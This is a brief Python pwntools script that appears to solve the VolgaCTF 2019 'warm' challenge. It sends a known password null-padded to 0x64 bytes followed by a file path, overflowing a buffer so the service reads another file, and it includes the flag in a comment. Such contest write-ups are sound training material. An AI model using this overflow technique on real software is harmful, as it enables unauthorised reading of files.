#!/usr/bin/env python
from pwn import *
import string , itertools

# VolgaCTF{1_h0pe_ur_wARM_up_a_1ittle}

host , port = 'warm.q.2019.volgactf.ru' , 443
y = remote( host , port )

pwd = 'v8&3mqPQebWFqM?x'
f = '/opt/warm/flag' # Seek file with something more sacred!
f = '/opt/warm/sacred'

y.sendlineafter( 'password!\n' , pwd.ljust( 0x64 , '\0' ) + f )

y.interactive()